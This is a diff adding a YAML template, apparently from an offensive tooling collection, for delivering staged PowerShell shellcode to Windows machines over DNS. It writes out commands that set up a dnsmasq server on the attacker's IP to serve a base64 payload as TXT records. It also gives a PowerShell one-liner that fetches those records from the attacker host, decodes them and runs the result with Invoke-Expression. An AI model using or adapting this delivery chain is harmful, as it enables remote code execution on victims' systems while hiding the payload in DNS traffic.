@@ -1,0 +1,27 @@
+---
+metadata:
+  filename: "deliver-windows-powershell-shcode_staged-dns.yaml"
+  tags: ["shell", "windows"]
+  created: "2026-03-11"
+  authors: ["@s3mme"]
+
+content: |
+  echo 'Creating dnsmasq config. Please wait...'; \
+  python {{ templates_dir }}/helper_scripts/chunk-txt_record.py "{{ include('scripts/pwsh-shcode_run-staged.yaml') | base64_pwsh }}" > /tmp/txt_records.txt
+  cat <<'EOF' > /tmp/dnsmasq.conf.head
+  listen-address={{ attacker_ip }}
+  bind-interfaces
+  log-queries
+  address=/pwn.com/10.13.37.42
+  EOF
+  cat /tmp/dnsmasq.conf.head /tmp/txt_records.txt > ./dnsmasq.conf
+  echo '================================================================'; \
+  echo '                      ------Kali Prep------                      '; \
+  echo 'Start DNS Server: dnsmasq --test -C ./dnsmasq.conf && sudo dnsmasq -C ./dnsmasq.conf; \
+  echo 'Sanity Check DNS entry: dig +short TXT test.com @{{ attacker_ip }}; \
+  echo 'Host your shellcode at "/favicon.png"'; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Deliver:'; \
+  echo 'Invoke-Expression (([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( ((((0..([int]$(Resolve-DnsName -Name example.com -Type "txt" -Server {{ attacker_ip }} -DnsOnly).Strings[0]))) | % {$((Resolve-DnsName -Name $([System.String]$_+".cdn.example.com") -Type txt -Server {{ attacker_ip }} -DnsOnly).Strings)}) -join "") ))))'
+  echo '================================================================';
